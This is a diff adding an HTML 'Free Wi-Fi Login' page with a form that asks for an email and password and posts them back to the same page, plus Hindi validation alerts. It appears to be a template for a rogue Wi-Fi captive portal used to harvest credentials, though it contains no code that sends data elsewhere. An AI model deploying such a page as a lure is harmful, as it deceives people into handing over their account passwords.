@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Free Wi-Fi Login</title>
+  <style>
+    body {
+      background: linear-gradient(to right, #00b4db, #0083b0);
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .login-box {
+      background: white;
+      padding: 30px 40px;
+      border-radius: 12px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      width: 320px;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+      color: #0083b0;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0 20px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    input[type="submit"] {
+      background-color: #0083b0;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background 0.3s;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #005f7a;
+    }
+  </style>
+
+  <script>
+    function validateForm() {
+      const email = document.forms["loginForm"]["username"].value;
+      const password = document.forms["loginForm"]["password"].value;
+      const emailPattern = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
+
+      if (!emailPattern.test(email)) {
+        alert("कृपया सही ईमेल पता दर्ज करें।");
+        return false;
+      }
+
+      if (password.length < 6) {
+        alert("पासवर्ड कम से कम 6 अक्षरों का होना चाहिए।");
+        return false;
+      }
+
+      return true;
+    }
+  </script>
+</head>
+<body>
+  <div class="login-box">
+    <h2>Login to Access Free Wi-Fi</h2>
+    <form name="loginForm" method="POST" onsubmit="return validateForm()">
+      <input type="email" name="username" placeholder="Enter your email" required>
+      <input type="password" name="password" placeholder="Enter your password" required>
+      <input type="submit" value="Connect">
+    </form>
+  </div>
+</body>
+</html>
